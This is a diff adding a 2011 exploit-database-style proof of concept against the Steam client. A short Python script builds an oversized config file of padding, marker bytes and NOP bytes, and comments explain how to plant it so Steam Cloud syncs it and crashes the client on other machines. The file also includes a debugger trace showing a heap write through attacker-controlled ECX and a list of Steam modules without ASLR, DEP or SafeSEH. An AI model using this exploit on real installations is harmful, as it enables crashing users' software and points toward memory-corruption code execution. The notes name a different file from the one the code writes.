@@ -1,0 +1,49 @@
+# Exploit Title: Steam Cloud Denial of Service 0day
+# Date: 06042011
+# Author: david.r.klein \x0agmail\x0acom
+# Software Link: http://steampowered.com
+# Version: Steam - Latest
+# Tested on: Windows XP/2003, Windows7
+# CVE : NA
+#
+# Notes: Copy file to C:\Program Files\Steam\userdata\<acctnums>\remote\sharedconfig.vdf
+# Run Steam.exe and let the program crash. Steam will Sync your config to your account before he crash occurs
+# Log in on a seperate computer with the same account and watch steam die. 
+#
+
+test = "A" * 32776
+test2= "BBBB" * 8
+test2+="ZZZZ" * 8
+test2+="\x90" * 32
+
+f = open('serverbrowser_ui.vdf', 'w') 
+f.write(test + test2)
+f.close()
+
+
+# (78c.bf0): Access violation - code c0000005 (first chance)
+# First chance exceptions are reported before any exception handling.
+# This exception may be expected and handled.
+# eax=02c915b0 ebx=000025d5 ecx=42424242 edx=01697b28 esi=02c915a8 edi=00eb0000
+# eip=7c91240b esp=0012d188 ebp=0012d1a0 iopl=0         nv up ei ng nz na pe cy
+# cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210287
+# ntdll!RtlpInsertFreeBlock+0x10d:
+# 7c91240b 8901            mov     dword ptr [ecx],eax  ds:0023:42424242=????????
+#
+# 0:000> d edx
+# 01697b28  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
+# 01697b38  5a 5a 5a 5a 5a 5a 5a 5a-5a 5a 5a 5a 5a 5a 5a 5a  ZZZZZZZZZZZZZZZZ
+# 01697b48  5a 5a 5a 5a 5a 5a 5a 5a-5a 5a 5a 5a 5a 5a 5a 5a  ZZZZZZZZZZZZZZZZ
+# 01697b58  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
+# 01697b68  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
+# 01697b78  00 fe ee fe ee fe ee fe-ee fe ee fe ee fe ee fe  ................
+#
+#
+# None of the below have aslr \ dep \ safeseh 
+# ModLoad: 3a000000 3a363000   C:\Program Files\Steam\SteamUI.dll
+# ModLoad: 3f000000 3f0ad000   C:\Program Files\Steam\tier0_s.dll
+# ModLoad: 3f600000 3f66e000   C:\Program Files\Steam\vstdlib_s.dll
+# ModLoad: 10000000 100af000   C:\Program Files\Steam\crashhandler.dll
+# ModLoad: 3fa00000 3fa32000   C:\Program Files\Steam\bin\FileSystem_Steam.dll
+# ModLoad: 3f200000 3f2a2000   C:\Program Files\Steam\bin\vgui2.dll
+# ModLoad: 04120000 04e06000   C:\Program Files\Steam\bin\libcef.dll
